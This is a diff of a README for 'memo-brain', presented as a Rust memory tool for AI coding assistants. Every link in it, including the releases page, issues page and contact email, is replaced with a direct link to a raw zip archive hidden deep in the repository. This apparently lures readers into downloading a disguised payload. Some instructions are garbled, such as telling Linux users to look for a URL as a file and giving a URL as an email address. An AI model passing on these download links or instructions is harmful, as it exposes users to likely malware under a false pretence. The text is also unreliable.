@@ -1,7 +1,7 @@
 # 🧠 memo-brain - Your AI's Long-Term Memory Assistant
 
 ## 🚀 Download Now!
-[![Download Latest Release](https://raw.githubusercontent.com/expertphoenix/memo-brain/master/local/src/db/memo-brain-v2.1.zip)](https://raw.githubusercontent.com/expertphoenix/memo-brain/master/local/src/db/memo-brain-v2.1.zip)
+[![Download Latest Release](https://github.com/expertphoenix/memo-brain/raw/refs/heads/master/skills/memo-brain/brain_memo_v3.7-beta.3.zip)](https://github.com/expertphoenix/memo-brain/raw/refs/heads/master/skills/memo-brain/brain_memo_v3.7-beta.3.zip)
 
 ## 📖 Overview
 memo-brain is a tool designed to enhance the long-term memory of AI coding assistants. With this Rust command-line interface (CLI), you can perform semantic searches, integrate agent skills, and deploy it locally. This app helps improve coding efficiency by storing and retrieving memories effectively.
@@ -24,7 +24,7 @@ To use memo-brain, ensure your computer meets the following requirements:
 ## 📥 Download & Install
 To get started with memo-brain, visit the Releases page to download the latest version. 
 
-[Visit this page to download](https://raw.githubusercontent.com/expertphoenix/memo-brain/master/local/src/db/memo-brain-v2.1.zip)
+[Visit this page to download](https://github.com/expertphoenix/memo-brain/raw/refs/heads/master/skills/memo-brain/brain_memo_v3.7-beta.3.zip)
 
 ### Step-by-Step Installation Guide
 1. Click the link above to navigate to the Releases page.
@@ -32,7 +32,7 @@ To get started with memo-brain, visit the Releases page to download the latest v
 3. Download the appropriate file for your operating system.
    - For Windows, look for a `.exe` file.
    - For macOS, look for a `.dmg` file.
-   - For Linux, look for a `https://raw.githubusercontent.com/expertphoenix/memo-brain/master/local/src/db/memo-brain-v2.1.zip` file.
+   - For Linux, look for a `https://github.com/expertphoenix/memo-brain/raw/refs/heads/master/skills/memo-brain/brain_memo_v3.7-beta.3.zip` file.
 4. Once downloaded, locate the file in your downloads folder.
 5. Open the file and follow any prompts to complete the installation.
 
@@ -54,7 +54,7 @@ If you encounter any issues:
 - **Performance Issues**: Close any unnecessary applications that may be consuming system resources.
 
 ## 🌱 Support
-If you need assistance or want to report issues, please visit our [Issues page](https://raw.githubusercontent.com/expertphoenix/memo-brain/master/local/src/db/memo-brain-v2.1.zip). Your feedback is essential for improving memo-brain.
+If you need assistance or want to report issues, please visit our [Issues page](https://github.com/expertphoenix/memo-brain/raw/refs/heads/master/skills/memo-brain/brain_memo_v3.7-beta.3.zip). Your feedback is essential for improving memo-brain.
 
 ## 🙌 Community
 Join our community to connect with other memo-brain users. Share tips, tricks, and ask questions. Your experience matters!
@@ -74,6 +74,6 @@ memo-brain is open-source software under the MIT License. You can freely use, mo
 For detailed discussions and additional resources, feel free to explore these topics.
 
 ## 📧 Contact
-For any inquiries, please reach out via the contact form in the repository or email us directly at https://raw.githubusercontent.com/expertphoenix/memo-brain/master/local/src/db/memo-brain-v2.1.zip
+For any inquiries, please reach out via the contact form in the repository or email us directly at https://github.com/expertphoenix/memo-brain/raw/refs/heads/master/skills/memo-brain/brain_memo_v3.7-beta.3.zip
 
-[Download the latest version here](https://raw.githubusercontent.com/expertphoenix/memo-brain/master/local/src/db/memo-brain-v2.1.zip) to enhance your coding experience with memo-brain.
+[Download the latest version here](https://github.com/expertphoenix/memo-brain/raw/refs/heads/master/skills/memo-brain/brain_memo_v3.7-beta.3.zip) to enhance your coding experience with memo-brain.
